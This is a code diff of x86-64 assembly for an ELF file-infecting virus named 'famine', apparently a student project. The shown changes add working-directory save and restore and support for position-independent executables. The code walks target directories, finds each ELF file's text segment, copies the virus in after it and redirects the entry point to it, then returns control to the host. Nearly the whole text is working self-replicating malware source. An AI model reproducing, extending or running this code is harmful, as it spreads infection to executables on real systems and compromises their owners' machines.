@@ -6,49 +6,61 @@ section .text
 default rel
 global _start
 host_entry	dq	0x0
+pay_off		dq	0x0
 
 _start:
-	call entry
-entry:
-;	pop r15
-;	mov r14, (entry - _start)
-;	sub r15, r14
-
-	push r15
 	push rdi
 	push rsi
 	push rcx
 	push rdx
-	push rbp
-	
+
 	; === Placing our 'famine' struct on the stack ===
-	mov rbp, rsp
 	push rbp
 	mov rbp, rsp
 	sub rsp, famine_size
 	mov rdi, VIRUS_SIZE
 	mov FAM(famine.payload_size), rdi
 
+	lea rdi, FAM(famine.old_pwd)
+	mov rsi, PATH_MAX
+	mov rax, 0x4f
+	syscall
+
 	lea rdi, [rel target_dir]
 	call _traverse_dirs
-	mov rax, [rel _start - 0x8]
+
+	lea rdi, FAM(famine.old_pwd)
+	mov rax, 0x50
+	syscall
+
+	add rsp, famine_size
+	mov rax, [rel _start - 16]
 	cmp rax, 0
 	je _exit
 
+	mov rdi, [rel _start - 8]
+	cmp rdi, 0
+	je .jmp
+
+	add rdi, 0x10
+	lea r15, [rel _start]
+	sub r15, rdi
+	add rax, r15
+
+	.jmp:
 	pop rbp
 	pop rdx
 	pop rcx
 	pop rsi
 	pop rdi
-	pop r15
-
 	jmp rax
 
 
 ; ##### LOOP THROUGH TARGET DIRECTORIES #####
 
 _traverse_dirs:
-	; === chdir(dirpath) && open(".", O_RDONLY, 0) ===
+	; === chdir(dirpath) && open(".", O_RDONLY, 0)  TODO : faire un chdir de retour après avoir stocké le current dirname grâce à getcwd syscall ===
+
 	mov rax, 0x50
 	syscall
 	cmp rax, 0
@@ -157,14 +169,14 @@ _file:
 	add rax, elf64_ehdr.e_phoff
 
 	; === Finding the text segment in file ===
-	mov r15, [rax]												; Storing e_phoff in r15
+	mov r11, [rax]												; Storing e_phoff in r11
 	mov r14, FAM(famine.map_ptr)
 	add r14, elf64_ehdr.e_phnum
 	movzx r14, word [r14]										; Storing e_phnum in r14
 
 	dec r14														; Decrementing by 1 since our counter starts at 0
 	mov rax, FAM(famine.map_ptr)
-	add rax, r15												; rax is now at the start of segment headers in file
+	add rax, r11												; rax is now at the start of segment headers in file
 	xor r13, r13												; Used to loop through all segment headers
 	_phnum_loop:
 		call _is_text_segment
@@ -194,7 +206,7 @@ _file:
 	mov rdi, FAM(famine.map_ptr)
 	add rdi, FAM(famine.txt_offset)
 	add rdi, FAM(famine.txt_filesz)
-	add rdi, 8
+	add rdi, 16
 	add rdi, VIRUS_SIZE
 	sub rdi, (_finish - signature)
 	mov rax, [rel signature]
@@ -218,10 +230,9 @@ _file:
 	add rax, elf64_ehdr.e_entry
 	mov rsi, [rax]
 	mov FAM(famine.orig_entry), rsi
-;	write_format entry, FAM(famine.orig_entry)
 	mov rdi, FAM(famine.txt_vaddr)
 	add rdi, FAM(famine.txt_filesz)
-	add rdi, 0x8
+	add rdi, 16
 	mov [rax], rdi
 	
 	; === Writing virus from injection point ===
@@ -232,11 +243,30 @@ _file:
 	mov rcx, 0x1
 	repnz movsq													; Copy host entry point
 	
+	mov rax, FAM(famine.map_ptr)
+	add rax, 0x10
+	movzx rax, word [rax]
+	cmp rax, 0x3
+	jne .entry
+
+	mov rdi, FAM(famine.map_ptr)								; Only write this if PIC
+	add rdi, FAM(famine.txt_offset)
+	add rdi, FAM(famine.txt_filesz)								; RDI at injection point
+	add rdi, 8
+	xor rsi, rsi
+	add rsi, FAM(famine.txt_offset)
+	add rsi, FAM(famine.txt_filesz)
+	mov FAM(famine.payload_off), rsi
+	lea rsi, FAM(famine.payload_off)
+	mov rcx, 0x1
+	repnz movsq													; Copy payload offset
+
+	.entry:
 	mov rdi, FAM(famine.map_ptr)
 	add rdi, FAM(famine.txt_offset)
 	add rdi, FAM(famine.txt_filesz)								; RDI at injection point
-	add rdi, 0x8
-	lea rsi, [rel _start]												; RSI at start of virus - RELATIVE HERE !
+	add rdi, 16
+	lea rsi, [rel _start]												; RSI at start of virus
 	mov rcx, VIRUS_SIZE											; Copy whole virus to injection point
 	repnz movsb
 	jmp _list_dir
